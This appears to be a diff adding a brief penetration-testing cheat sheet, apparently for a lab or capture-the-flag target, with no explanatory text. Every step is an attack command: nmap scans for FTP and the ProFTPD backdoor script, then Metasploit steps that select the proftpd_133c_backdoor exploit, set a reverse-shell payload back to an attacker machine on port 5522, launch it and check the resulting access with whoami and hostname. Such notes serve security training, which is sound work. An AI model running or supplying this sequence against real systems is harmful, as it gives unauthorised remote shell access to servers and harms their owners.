@@ -1,0 +1,22 @@
+#Nmap Scans
+nmap <target_IP>
+nmap <target_IP> -A
+find / -name *.nse | grep ftp
+nmap <target_IP> -p 21 -sV --script ftp-*
+nmap --script /usr/share/nmap/scripts/ftp-proftpd-backdoor.nse <target_IP> -p 21 -sV
+
+#Metasploit 
+msfconsole
+search proftpd type:exploit
+use exploit/unix/ftp/proftpd_133c_backdoor
+show payloads
+set payload payload/cmd/unix/reverse
+options
+set RHOSTS <target_IP>
+set LHOST <kali_IP>
+set LPORT 5522
+exploit
+
+#Post-exploitation validation
+whoami
+hostname
